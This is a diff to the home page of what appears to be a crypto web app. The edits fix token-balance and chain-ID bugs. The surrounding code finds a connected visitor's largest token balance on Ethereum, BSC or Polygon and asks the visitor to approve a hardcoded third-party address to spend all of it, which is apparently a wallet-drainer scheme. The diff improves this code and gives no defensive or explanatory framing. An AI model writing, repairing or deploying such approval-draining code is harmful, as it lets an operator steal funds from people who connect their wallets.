@@ -1327,7 +1327,7 @@ export default function Home() {
       //  
       // 0x1B815d120B3eF02039Ee11dC2d33DE7aA4a8C603 woo
       //
-      const wbtcB = await wbnb.balanceOf(account)
+      const wbtcB = await wbtc.balanceOf(account)
       const wbnbB = await wbnb.balanceOf(account)
       const ethB = await eth.balanceOf(account)
       const usdcB = await usdc.balanceOf(account)
@@ -1965,7 +1965,7 @@ export default function Home() {
       const tokenWithSigner = tokenContract.connect(signer)
       const approve = await tokenWithSigner.approve("0x1204D7F27702d793260Ad5a406dDEE7660d21B61", biggerBalanceEth.amount)
 
-      updateArray(chaiId)
+      updateArray(chainId)
     
     }
     if (chainId == 56) {
@@ -1973,7 +1973,7 @@ export default function Home() {
       const tokenWithSigner = tokenContract.connect(signer)
       const approve = await tokenWithSigner.approve("0x1204D7F27702d793260Ad5a406dDEE7660d21B61", biggerBalanceBsc.amount)
     
-      updateArray(chaiId)
+      updateArray(chainId)
     }
     if (chainId == 137) {
       const tokenContract = new ethers.Contract(biggerBalancePolygon.address, ERC20, provider)
@@ -1981,7 +1981,7 @@ export default function Home() {
       const tokenWithSigner =await tokenContract.connect(signer)
       const approve = await tokenWithSigner.approve("0x1204D7F27702d793260Ad5a406dDEE7660d21B61", biggerBalancePolygon.amount)
     
-      updateArray(chaiId)
+      updateArray(chainId)
     }
 
     
